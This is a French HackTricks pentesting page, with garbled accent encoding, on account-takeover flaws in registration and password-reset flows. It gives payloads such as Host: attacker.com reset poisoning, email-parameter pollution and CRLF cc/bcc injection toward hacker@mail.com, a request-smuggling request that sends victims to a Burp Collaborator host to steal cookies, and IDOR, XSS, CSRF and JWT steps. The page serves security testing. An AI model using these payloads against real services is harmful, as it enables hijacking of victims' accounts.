# Vuln√©rabilit√©s d'Inscription & de Prise de Contr√¥le

{% hint style="success" %}
Apprenez & pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez & pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* V√©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}


## Prise de Contr√¥le d'Inscription

### Inscription Dupliqu√©e

* Essayez de g√©n√©rer en utilisant un nom d'utilisateur existant
* V√©rifiez en variant l'email :
* majuscules
* \+1@
* ajoutez un point dans l'email
* caract√®res sp√©ciaux dans le nom de l'email (%00, %09, %20)
* Mettez des caract√®res noirs apr√®s l'email : `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### √ânum√©ration de Noms d'Utilisateur

V√©rifiez si vous pouvez d√©terminer quand un nom d'utilisateur a d√©j√† √©t√© enregistr√© dans l'application.

### Politique de Mot de Passe

Lors de la cr√©ation d'un utilisateur, v√©rifiez la politique de mot de passe (v√©rifiez si vous pouvez utiliser des mots de passe faibles).\
Dans ce cas, vous pouvez essayer de bruteforcer les identifiants.

### Injection SQL

[**V√©rifiez cette page** ](sql-injection/#insert-statement)pour apprendre comment tenter des prises de contr√¥le de compte ou extraire des informations via des **injections SQL** dans les formulaires d'inscription.

### Prises de Contr√¥le Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vuln√©rabilit√©s SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Changer d'Email

Lors de l'inscription, essayez de changer l'email et v√©rifiez si ce changement est correctement valid√© ou si vous pouvez le changer en des emails arbitraires.

### Autres V√©rifications

* V√©rifiez si vous pouvez utiliser des **emails jetables**
* **Long** **mot de passe** (>200) entra√Æne un **DoS**
* **V√©rifiez les limites de taux sur la cr√©ation de compte**
* Utilisez username@**burp\_collab**.net et analysez le **callback**

## **Prise de Contr√¥le de R√©initialisation de Mot de Passe**

### Fuite de Token de R√©initialisation de Mot de Passe Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Demandez une r√©initialisation de mot de passe √† votre adresse email
2. Cliquez sur le lien de r√©initialisation de mot de passe
3. Ne changez pas le mot de passe
4. Cliquez sur n'importe quel site tiers (ex : Facebook, Twitter)
5. Interceptez la requ√™te dans le proxy Burp Suite
6. V√©rifiez si l'en-t√™te referer fuit le token de r√©initialisation de mot de passe.

### Empoisonnement de R√©initialisation de Mot de Passe <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptez la requ√™te de r√©initialisation de mot de passe dans Burp Suite
2. Ajoutez ou modifiez les en-t√™tes suivants dans Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Transmettez la requ√™te avec l'en-t√™te modifi√©\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Recherchez une URL de r√©initialisation de mot de passe bas√©e sur l'_en-t√™te host_ comme : `https://attacker.com/reset-password.php?token=TOKEN`

### R√©initialisation de Mot de Passe Via Param√®tre Email <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les param√®tres API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et aller √† la fonctionnalit√© **Changer de mot de passe**.
2. D√©marrez Burp Suite et interceptez la requ√™te.
3. Envoyez-la √† l'onglet r√©p√©teur et modifiez les param√®tres : ID utilisateur/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Jeton de r√©initialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le jeton de r√©initialisation de mot de passe doit √™tre g√©n√©r√© al√©atoirement et √™tre unique √† chaque fois.\
Essayez de d√©terminer si le jeton expire ou s'il est toujours le m√™me, dans certains cas, l'algorithme de g√©n√©ration est faible et peut √™tre devin√©. Les variables suivantes pourraient √™tre utilis√©es par l'algorithme.

* Horodatage
* ID utilisateur
* Email de l'utilisateur
* Pr√©nom et nom de famille
* Date de naissance
* Cryptographie
* Num√©ro uniquement
* Petite s√©quence de jeton (caract√®res entre \[A-Z,a-z,0-9])
* R√©utilisation du jeton
* Date d'expiration du jeton

### Fuite du jeton de r√©initialisation de mot de passe <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. D√©clenchez une demande de r√©initialisation de mot de passe en utilisant l'API/UI pour un email sp√©cifique, par exemple : test@mail.com
2. Inspectez la r√©ponse du serveur et v√©rifiez le `resetToken`
3. Ensuite, utilisez le jeton dans une URL comme `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### R√©initialisation de mot de passe via collision de nom d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Inscrivez-vous sur le syst√®me avec un nom d'utilisateur identique √† celui de la victime, mais avec des espaces ins√©r√©s avant et/ou apr√®s le nom d'utilisateur. par exemple : `"admin "`
2. Demandez une r√©initialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utilisez le jeton envoy√© √† votre email et r√©initialisez le mot de passe de la victime.
4. Connectez-vous au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd √©tait vuln√©rable √† cette attaque.\
Voir : [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contr√¥le de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouvez un XSS √† l'int√©rieur de l'application ou d'un sous-domaine si les cookies sont limit√©s au domaine parent : `*.domain.com`
2. Fuite du **cookie de session** actuel
3. Authentifiez-vous en tant qu'utilisateur en utilisant le cookie

### Prise de contr√¥le de compte via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Utilisez **smuggler** pour d√©tecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Cr√©ez une requ√™te qui √©crasera le `POST / HTTP/1.1` avec les donn√©es suivantes :\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` dans le but de rediriger les victimes vers burpcollab et de voler leurs cookies\
3\. La requ√™te finale pourrait ressembler √† ce qui suit
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone rapporte l'exploitation de ce bug\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Prise de contr√¥le de compte via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Cr√©ez un payload pour le CSRF, par exemple : ‚Äúformulaire HTML avec soumission automatique pour un changement de mot de passe‚Äù
2. Envoyez le payload

### Prise de contr√¥le de compte via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Le JSON Web Token peut √™tre utilis√© pour authentifier un utilisateur.

* Modifiez le JWT avec un autre ID d'utilisateur / Email
* V√©rifiez la signature JWT faible

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
